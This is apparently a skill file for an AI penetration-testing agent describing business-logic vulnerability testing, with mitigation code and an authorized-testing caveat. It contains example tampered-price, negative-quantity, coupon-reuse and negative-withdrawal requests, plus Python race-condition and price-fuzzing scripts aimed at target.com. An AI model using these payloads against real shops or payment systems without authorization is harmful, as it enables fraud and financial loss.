---
name: business-logic-testing
description: Professional skills and methodology for business logic vulnerability testing
version: 1.0.0
---

# Business Logic Vulnerability Testing

## Overview

Business logic vulnerabilities are design flaws in an application's business processing flow that can lead to unauthorized operations, data tampering, financial loss, and more. This skill provides methods for detecting, exploiting, and mitigating business logic vulnerabilities.

## Vulnerability Types

### 1. Workflow Bypass

**Skip validation steps:**
- Directly access the final step
- Modify the order of steps
- Repeatedly execute a step

### 2. Price Manipulation

**Negative price:**
- Enter a negative amount
- Cause the account balance to increase

**Price tampering:**
- Modify the price on the frontend
- Modify the price in the API request

### 3. Quantity Limit Bypass

**Negative quantity:**
- Enter a negative number
- May cause inventory to increase

**Exceed the limit:**
- Modify the quantity limit
- Bypass via batch operations

### 4. Race Condition

**Concurrent requests:**
- Send multiple requests at the same time
- Bypass single-use limits

### 5. State Manipulation

**State rollback:**
- Change a completed order back to pending payment
- Modify the order status

## Testing Methods

### 1. Workflow Analysis

**Identify business processes:**
- Registration flow
- Purchase flow
- Withdrawal flow
- Approval flow

**Test step skipping:**
```
Normal flow: step 1 → step 2 → step 3
Test: directly access step 3
Test: step 1 → step 3 (skip step 2)
```

### 2. Parameter Tampering

**Modify key parameters:**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # changed to 0.01
}
```

**Negative value testing:**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. Concurrency Testing

**Send requests simultaneously:**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase', 
                  json={'product_id': 123, 'quantity': 1})

# Send 10 requests simultaneously
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. State Modification

**Modify order status:**
```http
PATCH /api/order/123
{
  "status": "completed"  # change to completed
}
```

**Roll back the state:**
```http
PATCH /api/order/123
{
  "status": "pending"  # roll back from completed to pending payment
}
```

## Exploitation Techniques

### Price Manipulation

**Negative price:**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**Modify the frontend price:**
```javascript
// Frontend code
const price = 100.00;

// Change to
const price = 0.01;
```

**API price modification:**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # original price 100.00
      "quantity": 1
    }
  ]
}
```

### Quantity Limit Bypass

**Negative quantity:**
```json
{
  "product_id": 123,
  "quantity": -10  # may cause inventory to increase
}
```

**Exceed the limit:**
```json
{
  "product_id": 123,
  "quantity": 999999  # exceeds the single-purchase limit
}
```

### Coupon Abuse

**Reuse:**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# Reuse the same coupon
```

**Inactive coupon:**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # use an expired coupon
  "items": [...]
}
```

### Withdrawal Vulnerabilities

**Negative withdrawal:**
```json
{
  "amount": -1000.00  # may cause the account balance to increase
}
```

**Exceed the balance:**
```json
{
  "amount": 999999.00  # exceeds the account balance
}
```

### Race Condition

**Concurrent purchase:**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Flash sale, concurrent requests
for i in range(100):
    threading.Thread(target=buy).start()
```

## Bypass Techniques

### Frontend Validation Bypass

**Call the API directly:**
- Bypass frontend JavaScript validation
- Send the API request directly

**Modify the request:**
- Intercept with Burp Suite
- Modify the parameters and then send

### Status Code Analysis

**Observe the responses:**
- 200 OK - possibly succeeded
- 400 Bad Request - parameter error
- 403 Forbidden - insufficient privileges
- 500 Internal Server Error - server error

### Leveraging Error Messages

**Obtain information from error messages:**
```
Error: "Insufficient balance, current balance: 100.00"
→ The account balance information can be obtained
```

## Tool Usage

### Burp Suite

**Use Repeater:**
1. Intercept the business request
2. Modify key parameters
3. Observe the response

**Use Intruder:**
1. Mark the parameters
2. Use a payload list
3. Run batch testing

### Custom Scripts

```python
import requests
import json

def test_price_manipulation():
    # Test price modification
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## Verification and Reporting

### Verification Steps

1. Confirm that the business logic restrictions can be bypassed
2. Verify that unauthorized operations can be performed
3. Assess the impact (financial loss, data tampering, etc.)
4. Record a complete PoC
5. Use the `report_finding` tool to record the confirmed vulnerability in the platform (the only entry point for recording vulnerabilities on this platform); the fields cover location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting Key Points

- Vulnerability location and the business process
- The unauthorized operations that can be performed
- Complete exploitation steps and PoC
- Remediation advice (server-side validation, business rule checks, etc.)

## Mitigation Measures

### Recommended Solutions

1. **Server-side validation**
   ```python
   def process_purchase(product_id, quantity, price):
       # Get the real price from the database
       real_price = db.get_product_price(product_id)
       
       # Validate the price
       if price != real_price:
           raise ValueError("Price mismatch")
       
       # Validate the quantity
       if quantity <= 0:
           raise ValueError("Invalid quantity")
       
       # Process the purchase
       process_order(product_id, quantity, real_price)
   ```

2. **State machine validation**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"
       
       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }
       
       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **Concurrency control**
   ```python
   import threading
   
   lock = threading.Lock()
   
   def process_order(order_id):
       with lock:
           # Check the order status
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")
           
           # Process the order
           process(order)
   ```

4. **Business rule validation**
   ```python
   def validate_business_rules(order):
       # Validate the quantity limit
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")
       
       # Validate the price range
       if order.price <= 0:
           raise ValueError("Invalid price")
       
       # Validate inventory
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **Audit logging**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## Notes

- Perform only in an authorized testing environment
- Avoid causing real impact to the business
- Be aware of differences between business processes
- Pay attention to data consistency during testing
